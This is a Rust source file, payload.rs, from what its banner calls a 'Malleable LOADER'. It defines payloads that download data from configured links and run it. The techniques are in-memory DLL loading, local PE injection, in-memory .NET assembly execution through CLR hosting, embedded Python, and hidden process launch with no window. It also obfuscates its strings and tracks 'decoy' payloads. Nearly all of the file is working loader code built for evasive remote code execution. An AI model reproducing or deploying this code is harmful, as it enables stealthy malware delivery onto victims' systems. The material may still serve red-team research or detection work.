use crate::config::Config;
use crate::link::{Link, LinkFetch};
use crate::payload_util::create_directory;
use crate::payload_util::same_hash_sha512;
use crate::payload_util::CommandLine;
use crate::rundata::RunData;
use crate::utils::calculate_path;

#[cfg(target_os = "linux")]
use crate::payload_util::fail_linux_message;
#[cfg(target_os = "linux")]
use crate::payload_util::set_permission;

#[cfg(target_os = "windows")]
type DllEntryPoint = extern "C" fn(*const c_char); //type DllEntryPoint = extern "C" fn() -> c_int;
#[cfg(target_os = "windows")]
use crate::python_embedder;
#[cfg(target_os = "windows")]
use rspe::reflective_loader;
#[cfg(target_os = "windows")]
use std::ffi::CString;
#[cfg(target_os = "windows")]
use std::mem;
#[cfg(target_os = "windows")]
use std::os::raw::c_char; //use std::os::raw::c_int;
#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;
#[cfg(target_os = "windows")]
const CREATE_NO_WINDOW: u32 = 0x08000000;

use anyhow::Result;
use serde::{Deserialize, Serialize};
use std::fs::File;
use std::io::stdout;
use std::io::Cursor;
use std::io::Write;
use std::path::PathBuf;
use std::process::Command;
use std::process::Stdio;
use std::{thread, time};

use cryptify::encrypt_string;
use log::debug;
use log::error;
use log::info;

pub enum PayloadExecThread {
    NoThread(),
    Thread(thread::JoinHandle<()>, Payload),
}

#[derive(PartialEq, Serialize, Deserialize, Clone)]
#[serde(rename = "yl")]
pub enum Payload {
    Banner(),
    Print(Print),
    StopLoader(),
    WriteFile(WriteFile),
    WriteZip(WriteZip),
    Ec(Ec),
    EPY(EPY),
    #[serde(rename = "dme")]
    DFM(DFM),
    //ReflectivePEFromMemory(ReflectivePEFromMemory),
    LocalPeInjection(LocalPeInjection),
    DotnetFromMemory(DotnetFromMemory),
}
impl Payload {
    pub fn exec_payload(&self, config: &Config) -> PayloadExecThread {
        let exec_result = match &self {
            Payload::Banner() => banner(),
            Payload::Print(payload) => payload.print_msg(config),
            Payload::StopLoader() => stoploader(),
            Payload::WriteFile(payload) => payload.write_file(config),
            Payload::WriteZip(payload) => payload.write_zip(config),
            Payload::Ec(payload) => payload.exec_file(),
            Payload::EPY(payload) => payload.exec_python_with_embedder(),
            Payload::DFM(payload) => payload.dll_from_memory(config),
            //Payload::ReflectivePEFromMemory(payload) => payload.reflective_pe_from_memory(config),
            Payload::LocalPeInjection(payload) => payload.exec_local_pe_injection(config),
            Payload::DotnetFromMemory(payload) => payload.exec_dotnet_from_memory(config),
        };

        match exec_result {
            Ok(a) => a,
            Err(e) => {
                error!("{}{}", encrypt_string!("exec error: "), e);

                PayloadExecThread::NoThread()
            }
        }
    }
    pub fn print_payload_compact(&self) {
        debug!("+{}", self.string_payload_compact());
    }
    pub fn string_payload_compact(&self) -> String {
        format!("{}", serde_json::to_string(self).unwrap_or_default())
    }
    pub fn is_same_payload(&self, other_payload: &Payload) -> bool {
        let self_serialized = serde_json::to_string(self).unwrap();
        let other_serialized = serde_json::to_string(other_payload).unwrap();
        self_serialized == other_serialized
    }
    //TODO DECOTY, la c'est que les payloads normal, il va falloir convertir
    pub fn is_already_running_or_runonce_payload(&self, run_data: &mut RunData) -> bool {
        for running_payload in &mut *run_data.running_thread_payload {
            if self.is_same_payload(&running_payload.1) {
                info!("{}", encrypt_string!("Payload is already running"));
                return true;
            }
        }
        for running_once in &mut *run_data.runonce_payload {
            if self.is_same_payload(&running_once) {
                info!("{}", encrypt_string!("Payload already run once"));
                return true;
            }
        }
        return false;
    }

    pub fn is_already_running_or_runonce_decoy_update(&self, run_data: &mut RunData) -> bool {
        for running_payload in &mut *run_data.running_thread_decoy_update {
            if self.is_same_payload(&running_payload.1) {
                info!("{}", encrypt_string!("Payload is already running"));
                return true;
            }
        }
        for running_once in &mut *run_data.runonce_decoy_update {
            if self.is_same_payload(&running_once) {
                info!("{}", encrypt_string!("Payload already run once"));
                return true;
            }
        }
        return false;
    }

    pub fn is_already_running_or_runonce_decoy_payload(&self, run_data: &mut RunData) -> bool {
        for running_payload in &mut *run_data.running_thread_decoy_payload {
            if self.is_same_payload(&running_payload.1) {
                info!("{}", encrypt_string!("Payload is already running"));
                return true;
            }
        }
        for running_once in &mut *run_data.runonce_decoy_payload {
            if self.is_same_payload(&running_once) {
                info!("{}", encrypt_string!("Payload already run once"));
                return true;
            }
        }
        return false;
    }

    pub fn is_runonce(&self) -> bool {
        match &self {
            Payload::Banner() => false,
            Payload::Print(payload) => payload.runonce,
            Payload::StopLoader() => false,
            Payload::WriteFile(payload) => payload.runonce,
            Payload::WriteZip(payload) => payload.runonce,
            Payload::Ec(payload) => payload.runonce,
            Payload::EPY(payload) => payload.runonce,
            Payload::DFM(payload) => payload.runonce,
            //Payload::ReflectivePEFromMemory(payload) => payload.runonce,
            Payload::LocalPeInjection(payload) => payload.runonce,
            Payload::DotnetFromMemory(payload) => payload.runonce,
        }
    }
}

#[derive(PartialEq, Serialize, Deserialize, Clone)]
#[serde(rename = "dme")]
pub struct DFM {
    #[serde(rename = "lk")]
    pub link: Link,
    #[serde(rename = "ep")]
    pub dll_entrypoint: String,
    #[serde(rename = "cc")]
    pub commandline: String,
    #[serde(rename = "th")]
    pub thread: bool,
    #[serde(rename = "ro")]
    pub runonce: bool,
}

impl DFM {
    #[cfg(target_os = "linux")]
    pub fn dll_from_memory(&self, _config: &Config) -> Result<PayloadExecThread, anyhow::Error> {
        fail_linux_message(format!("{}", encrypt_string!("DFM")));
        Ok(PayloadExecThread::NoThread())
    }

    #[cfg(target_os = "windows")]
    pub fn dll_from_memory(&self, config: &Config) -> Result<PayloadExecThread, anyhow::Error> {
        let data: Vec<u8> = self.link.fetch_data(config)?;

        if self.thread {
            let thread_dll_entrypoint = self.dll_entrypoint.clone();
            let thread_dll_commandline = self.commandline.clone();
            let dllthread = thread::spawn(move || {
                dll_from_memory_exec(data, thread_dll_entrypoint, thread_dll_commandline);
            });
            return Ok(PayloadExecThread::Thread(
                dllthread,
                Payload::DFM(self.clone()),
            ));
        } else {
            dll_from_memory_exec(data, self.dll_entrypoint.clone(), self.commandline.clone());
            return Ok(PayloadExecThread::NoThread());
        }
    }
}

#[cfg(target_os = "windows")]
pub fn dll_from_memory_exec(data: Vec<u8>, dll_entrypoint: String, dll_commandline: String) {
    let dll_data: &[u8] = &data;
    info!(
        "{}",
        encrypt_string!("Map DLL in memory (MemoryLoadLibrary)")
    );
    let mm = memorymodule_rs::MemoryModule::new(dll_data);
    info!(
        "{}{}{}",
        encrypt_string!("Retreive DLL entrypoint: "),
        &dll_entrypoint,
        encrypt_string!(" via (MemoryGetProcAddress)"),
    );

    let dll_entry_point =
        unsafe { mem::transmute::<_, DllEntryPoint>(mm.get_function(&dll_entrypoint)) };
    info!(
        "{}{}{}{}{}",
        encrypt_string!("commandline for DLL."),
        &dll_entrypoint,
        encrypt_string!(".('"),
        &dll_commandline,
        encrypt_string!("')")
    );
    let c_commandline = CString::new(dll_commandline).unwrap_or_else(|e| {
        error!("Error in CString conversion: {}", e);
        // WARNING: unwrap and return empty. probably its better to return an error instead of something NULL.
        CString::new("").unwrap()
    });
    info!("{}", encrypt_string!("dll_entry_point()"),);
    let _result = dll_entry_point(c_commandline.as_ptr());
    info!("{}", encrypt_string!("Drop DLL memory (MemoryFreeLibrary)"));
    drop(mm);
    info!("{}", encrypt_string!("DFM: end"));
}

#[derive(PartialEq, Serialize, Deserialize, Clone)]
pub struct EPY {
    pub path: String, //path of python directory
    pub python_code: String,
    pub thread: bool,
    pub runonce: bool,
}
impl EPY {
    #[cfg(target_os = "linux")]
    pub fn exec_python_with_embedder(&self) -> Result<PayloadExecThread, anyhow::Error> {
        fail_linux_message(format!("{}", encrypt_string!("EPY")));
        return Ok(PayloadExecThread::NoThread());
    }

    #[cfg(target_os = "windows")]
    pub fn exec_python_with_embedder(&self) -> Result<PayloadExecThread, anyhow::Error> {
        //use crate::python_embedder;

        let path: PathBuf = calculate_path(&self.path)?;

        info!(
            "{}{}\n",
            encrypt_string!("execute python with Embedder: "),
            &self.python_code
        );
        if self.thread {
            let thread_python_path = path.clone();
            let thread_python_code = self.python_code.clone();
            let tj: thread::JoinHandle<()> = thread::spawn(move || {
                python_embedder::embedder(&thread_python_path, &thread_python_code);
            });
            return Ok(PayloadExecThread::Thread(
                tj,
                Payload::EPY(self.clone()),
            ));
        } else {
            python_embedder::embedder(&path, &self.python_code);
            return Ok(PayloadExecThread::NoThread());
        }
    }
}

pub fn banner() -> Result<PayloadExecThread, anyhow::Error> {
    //TODO encrypt this str
    let malleable = encrypt_string!("Malleable");
    let loader = encrypt_string!("LOADER");
    let banner: &str = &format!(
        r#"
                                 ╓╖
                         , ▒╗,  ▒▒▒▒╖   ╓▒▒
  {malleable}                ░░▒▒▒╖▒▒▒▒╣╣╖▒▒▒┐
 ┬─┐┬ ┬┌─┐┌┬┐        ▒▒@▒╓▒░░░░░░▒▒▒▒▒▒▒▒▒╢▓╖╓╓╖H┐
 ├┬┘│ │└─┐ │          ▒░░░░▒``▒░░░░░▒▒▒▒▒▒╢▒╢╢▒▒░`
 ┴└─└─┘└─┘ ┴   ,╓╓╓╥           ░░░░░░░▒▒▒▒▒▒▒▒▒╢╢
   {loader}      `  ▒`               ░░░░▒▒▒▒▒▒▒╢╢▒╣▒ÑH╗
                          ,▄       ░░░▒▒▒▒▒▒▒╢▒▒▒╢▒▒▒╜
               ╓╖       ╓  ██     ░▓``██▒▒▒▒▒▒▒╢▒╢╣╣
                │       █████▌   ░▐█,▄███▒▒░░▒▒▒▒╢╢╢@╖
                ╙▒      └███▀     └█████▌Ñ░░░▒▒▒▒╢╢╣▒▒░╣
                 .¿          ▄▄▄▄▄▄░"▀▀ `░░░▒▒╫╣╢╢╢╢╣╣╓▒▒
                     :``  ,, ╙████▀   ,  ░╫╬Ñ╜▒▒▒▒▒╣╢╫@▒╙▓╖
               ,░      ▒╢╫╢╢▓▒╜H   ░  ╨╨╜╙╙░  '▒▒╢▒▒▒╢▒╣▓▒▓▓╖
                  ▒ ░  ▒╙╢╢╢╢▓,               ` ░▒▒╢▒▒▒╢▒▓░╙╢N
               └╜▒▒@@  '░▒╢╣╢╢╣@,           ╓░▒ ▒░▒▒╢▒▒╣▒╢╣ ╙╙▒
                      ╙ ▒░▒╢╢╣╢▓╢╗              ▒╙░░▒╢▒╢╜╨╢▒
                        ╙▒░▒╢▒╣╣╣╨          ░ `  ░▒░║╣╢╜   `
                          "╨▒╜╢╢Ñ                  ░▒╜
                                                 ``a "#
    );

    let sleep_time = time::Duration::from_millis(3);
    for c in banner.chars() {
        print!("{}", c);
        let _ = stdout().flush();
        thread::sleep(sleep_time);
    }
    println!("");
    let sleep_time = time::Duration::from_millis(3000);
    thread::sleep(sleep_time);
    Ok(PayloadExecThread::NoThread())
}

pub fn stoploader() -> Result<PayloadExecThread, anyhow::Error> {
    std::process::exit(0);
}
#[derive(PartialEq, Serialize, Deserialize, Clone)]
pub struct WriteZip {
    pub link: Link,
    pub path: String,
    pub retry: i32, //-1 infinite; pour le download
    pub runonce: bool,
    //TODO thread
}

impl WriteZip {
    pub fn write_zip(&self, config: &Config) -> Result<PayloadExecThread, anyhow::Error> {
        //TODO found a way, not to recreate everything every time this payload run

        //let archive: Vec<u8> = self.link.fetch_data(config)?;
        let mut retries = self.retry;
        let archive: Vec<u8> = loop {
            match self.link.fetch_data(config) {
                Ok(data) => break data,
                Err(e) => {
                    error!(
                        "retry={}/{} Fail fetch_data {}",
                        retries, self.retry, serde_json::to_string(&self.link).unwrap_or_default()
                    );
                    if retries == 0 {
                        return Err(e);
                    } else if retries > 0 {
                        retries -= 1;
                    }
                    // sinon, retry == -1, on continue indéfiniment
                }
            }
        };

        let path: PathBuf = calculate_path(&self.path)?;
        let _ = create_directory(&path)?;

        info!("{}{:?}", encrypt_string!("[+] Write zip: "), path);
        match zip_extract::extract(Cursor::new(archive), &path, true) {
            Ok(_) => {}
            Err(error) => {
                error!(
                    "{}{}",
                    encrypt_string!("error to unzip python lib: "),
                    error
                )
            }
        }

        Ok(PayloadExecThread::NoThread())
    }
}

#[derive(PartialEq, Serialize, Deserialize, Clone)]
pub struct WriteFile {
    pub link: Link,
    pub path: String,
    pub hash: String, // optionnal hash to verify if an existing file should be replaced or not.
    pub runonce: bool,
}

impl WriteFile {
    pub fn write_file(&self, config: &Config) -> Result<PayloadExecThread, anyhow::Error> {
        let path: PathBuf = calculate_path(&self.path)?;

        if same_hash_sha512(&self.hash, &path) == false {
            let _ = create_directory(&path)?;

            let body: Vec<u8> = self.link.fetch_data(config)?;

            info!("{}{:?}", encrypt_string!("[+] Write file: "), path);
            let mut f = File::create(&path)?;
            f.write_all(&body)?;
        } else {
            info!("{}{:?}", encrypt_string!("[+] No Write, same hash: "), path);
        }
        Ok(PayloadExecThread::NoThread())
    }
}

#[derive(PartialEq, Serialize, Deserialize, Clone)]
pub struct Ec {
    pub path: String,
    //pub commandline: CommandLine,
    pub cmdline: String,
    pub thread: bool,
    pub runonce: bool,
    pub visible: bool,
}

impl Ec {
    // https://doc.rust-lang.org/std/process/struct.Command.html
    pub fn exec_file(&self) -> Result<PayloadExecThread, anyhow::Error> {
        let path: PathBuf = calculate_path(&self.path)?;

        info!("{}{:?} {}", encrypt_string!("Exec "), &path, &self.cmdline);
        let mut comm = Command::new(&path);

        #[cfg(target_os = "linux")]
        set_permission(&path);

        // TODO refacto with payload_utils.commandline
        for i in self.cmdline.trim().split_whitespace() {
            comm.arg(i);
        }
        if self.thread {
            let thread_visible = self.visible;
            let tj: thread::JoinHandle<()> = thread::spawn(move || {
                if thread_visible {
                    let _output = comm.spawn().expect("Failed to execute process");
                } else {
                    comm.stdin(Stdio::null())
                        .stdout(Stdio::null())
                        .stderr(Stdio::null());

                    #[cfg(target_os = "windows")]
                    comm.creation_flags(CREATE_NO_WINDOW);
/*
TODO to fix:

thread '<unnamed>' panicked at src/payload.rs:447:49:
Failed to execute process: Os { code: 2, kind: NotFound, message: "Le fichier spécifié est introuvable." }
note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace

*/

                    let _output = comm.output().expect("Failed to execute process");
                };
            });
            return Ok(PayloadExecThread::Thread(tj, Payload::Ec(self.clone())));
        } else {
            if self.visible {
                let _output = comm.spawn()?;
            } else {
                comm.stdin(Stdio::null())
                    .stdout(Stdio::null())
                    .stderr(Stdio::null());

                #[cfg(target_os = "windows")]
                comm.creation_flags(CREATE_NO_WINDOW);

                let _output = comm.output()?;
            };
            return Ok(PayloadExecThread::NoThread());
        };
    }
}

/*
impl Exec {
    // https://doc.rust-lang.org/std/process/struct.Command.html
    pub fn exec_file(&self) -> Result<PayloadExecThread, anyhow::Error> {
        let path: PathBuf = calculate_path(&self.path)?;
        info!("{}{:?} {}", encrypt_string!("Exec "), &path, &self.cmdline);
        let mut comm = Command::new(&path);

        #[cfg(target_os = "linux")]
        set_permission(&path);

        for i in self.cmdline.trim().split_whitespace() {
            comm.arg(i);
        }
        if self.thread {
            let tj: thread::JoinHandle<()> = thread::spawn(move || {
                let mut c = comm
                    .spawn()
                    .expect(&encrypt_string!("failed to execute process"));
                let _ = c.wait();
            });
            return Ok(PayloadExecThread::Thread(tj, Payload::Exec(self.clone())));
        } else {
            let _output: std::process::Output = comm
                .output()
                .expect(&encrypt_string!("failed to execute process"));
            //let _hello: Vec<u8> = output.stdout;
                return Ok(PayloadExecThread::NoThread());
        };
    }
}
*/

/* 
#[derive(PartialEq, Serialize, Deserialize, Clone)]
pub struct ReflectivePEFromMemory {
    pub link: Link,
    pub thread: bool,
    pub runonce: bool,
}

impl ReflectivePEFromMemory {
    #[cfg(target_os = "linux")]
    pub fn reflective_pe_from_memory(
        &self,
        _config: &Config,
    ) -> Result<PayloadExecThread, anyhow::Error> {
        fail_linux_message(format!("{}", encrypt_string!("ReflectivePEFromMemory")));
        Ok(PayloadExecThread::NoThread())
    }

    #[cfg(target_os = "windows")]
    pub fn reflective_pe_from_memory(
        &self,
        config: &Config,
    ) -> Result<PayloadExecThread, anyhow::Error> {
        let data: Vec<u8> = self.link.fetch_data(config)?;

        if self.thread {
            let thread = thread::spawn(move || {
                info!("{}", encrypt_string!("ReflectivePEFromMemory"));
                unsafe {
                    reflective_loader(data.clone());
                };
            });
            return Ok(PayloadExecThread::Thread(
                thread,
                Payload::ReflectivePEFromMemory(self.clone()),
            ));
        } else {
            info!("{}", encrypt_string!("ReflectivePEFromMemory"));
            unsafe {
                reflective_loader(data.clone());
            };
            return Ok(PayloadExecThread::NoThread());
        }
    }
}

*/

#[cfg(target_os = "windows")]
use crate::local_pe_injection::main::local_pe_injection;
//#[cfg(target_os = "windows")]

#[derive(PartialEq, Serialize, Deserialize, Clone)]
pub struct LocalPeInjection {
    pub link: Link,
    pub commandline: CommandLine,
    pub dll_entrypoint: String,
    pub thread: bool,
    pub runonce: bool,
}
impl LocalPeInjection {
    #[cfg(target_os = "linux")]
    pub fn exec_local_pe_injection(
        &self,
        _config: &Config,
    ) -> Result<PayloadExecThread, anyhow::Error> {
        fail_linux_message(format!("{}", encrypt_string!("LocalPeInjection")));
        return Ok(PayloadExecThread::NoThread());
    }

    #[cfg(target_os = "windows")]
    pub fn exec_local_pe_injection(
        &self,
        config: &Config,
    ) -> Result<PayloadExecThread, anyhow::Error> {
        let args_ok: String = self.commandline.get_string()?;
        let data: Vec<u8> = self.link.fetch_data(config)?;

        if self.thread {
            let thread_dll_entrypoint = self.dll_entrypoint.clone();
            let args_ok_commandline = args_ok.clone();
            let thread = thread::spawn(move || {
                let _ = local_pe_injection(args_ok_commandline, thread_dll_entrypoint, data);
            });
            return Ok(PayloadExecThread::Thread(
                thread,
                Payload::LocalPeInjection(self.clone()),
            ));
        } else {
            let _ = local_pe_injection(args_ok, self.dll_entrypoint.clone(), data);
            return Ok(PayloadExecThread::NoThread());
        }
    }
}

// DOTNET
#[cfg(target_os = "windows")]
use clroxide::clr::Clr;

#[derive(PartialEq, Serialize, Deserialize, Clone)]
pub struct DotnetFromMemory {
    pub link: Link,
    pub commandline: CommandLine,
    pub thread: bool,
    pub runonce: bool,
    pub visible: bool,
}
impl DotnetFromMemory {
    #[cfg(target_os = "linux")]
    pub fn exec_dotnet_from_memory(
        &self,
        _config: &Config,
    ) -> Result<PayloadExecThread, anyhow::Error> {
        fail_linux_message(format!("{}", encrypt_string!("DotnetFromMemory")));
        return Ok(PayloadExecThread::NoThread());
    }

    #[cfg(target_os = "windows")]
    pub fn exec_dotnet_from_memory(
        &self,
        config: &Config,
    ) -> Result<PayloadExecThread, anyhow::Error> {
        let args_ok = self.commandline.get_buffer()?;
        let data: Vec<u8> = self.link.fetch_data(config)?;

        if self.thread {
            let args_ok_commandline = args_ok.clone();
            let visible = self.visible.clone();
            let thread = thread::spawn(move || {
                // WARNING unwrap into a thread. not problematic but TODO try JoinHandle<Resultxxx> instead of JoinHandle<()> -> it could help to return output details
                let mut clr = Clr::new(data, args_ok_commandline).unwrap();
                let result: String = clr.run().unwrap();
                if visible {
                    println!("{}", result);
                };
            });
            return Ok(PayloadExecThread::Thread(
                thread,
                Payload::DotnetFromMemory(self.clone()),
            ));
        } else {
            //let mut clr: Clr = Clr::new(data, args_ok)?;
            let mut clr: Clr = Clr::new(data, args_ok).map_err(|e| anyhow::anyhow!(e))?;
            let result: String = clr.run().map_err(|e| anyhow::anyhow!(e))?;
            if self.visible {
                println!("{}", result);
            };
            return Ok(PayloadExecThread::NoThread());
        }
    }
}

#[derive(PartialEq, Serialize, Deserialize, Clone)]
pub struct Print {
    pub msg: CommandLine,
    pub runonce: bool,
}
impl Print {
    pub fn print_msg(&self, _config: &Config) -> Result<PayloadExecThread, anyhow::Error> {
        println!("{}", self.msg.get_string()?);
        thread::sleep(time::Duration::from_millis(1000));
        return Ok(PayloadExecThread::NoThread());
    }
}
